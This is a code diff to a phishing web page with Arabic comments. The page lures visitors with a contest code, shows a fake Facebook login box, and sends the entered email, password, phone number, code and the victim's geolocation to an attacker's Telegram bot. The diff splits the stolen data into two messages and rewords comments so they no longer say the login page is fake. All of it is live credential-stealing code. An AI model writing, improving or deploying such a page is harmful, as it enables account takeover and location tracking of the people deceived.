@@ -127,7 +127,7 @@
     🎉 كود المتسابق الخاص بك: <span id="contestantCode" style="font-weight: bold;"></span>
   </div>
 
-  <!-- صفحة تسجيل دخول وهمية -->
+  <!-- صفحة تسجيل دخول تشبه فيسبوك -->
   <div class="modal" id="loginModal">
     <div class="modal-header">facebook</div>
     <span class="close" onclick="closeLogin()">×</span>
@@ -143,7 +143,7 @@
     let botToken = '';
     let chatId = '';
 
-    // تحميل إعدادات البوت من config.json
+    // تحميل إعدادات البوت
     fetch('config.json')
       .then(res => res.json())
       .then(data => {
@@ -151,7 +151,7 @@
         chatId = data.chatId;
       });
 
-    // عرض الرقم المحفوظ
+    // عرض الرقم
     const phone = localStorage.getItem("userPhone");
     if (phone) {
       document.getElementById('phoneDisplay').textContent = "📱 رقمك هو: " + phone;
@@ -177,54 +177,28 @@
       document.getElementById('contestantCode').textContent = code;
       document.getElementById('codeDisplay').style.display = 'block';
 
-      // جلب الموقع ثم إرسال كل شيء برسالة واحدة
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-          const fullMessage =
-            `🔐 محاولة تسجيل دخول:\n` +
-            `📧: ${email}\n` +
-            `🔑: ${password}\n` +
-            `📱 الهاتف: ${phone}\n` +
-            `🏷 الكود: ${code}\n` +
-            `📍 الموقع: ${mapLink}`;
-
-          sendToTelegram(fullMessage);
-        }, () => {
-          const fallbackMessage =
-            `🔐 محاولة تسجيل دخول:\n` +
-            `📧: ${email}\n` +
-            `🔑: ${password}\n` +
-            `📱 الهاتف: ${phone}\n` +
-            `🏷 الكود: ${code}\n` +
-            `⚠️ تعذر الحصول على الموقع.`;
-
-          sendToTelegram(fallbackMessage);
-        });
-      } else {
-        const unsupportedMessage =
-          `🔐 محاولة تسجيل دخول:\n` +
-          `📧: ${email}\n` +
-          `🔑: ${password}\n` +
-          `📱 الهاتف: ${phone}\n` +
-          `🏷 الكود: ${code}\n` +
-          `⚠️ الموقع غير مدعوم في المتصفح.`;
-
-        sendToTelegram(unsupportedMessage);
-      }
-
-      closeLogin();
-    }
-
-    function sendToTelegram(message) {
+      const message = `🔐 محاولة تسجيل دخول\n📧: ${email}\n🔑: ${password}\n📱 الهاتف: ${phone}\n🏷 الكود: ${code}`;
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ chat_id: chatId, text: message })
       });
+
+      // إرسال الموقع
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const locMessage = `🌍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: locMessage })
+          });
+        });
+      }
+
+      closeLogin();
     }
 
     function generateCode() {
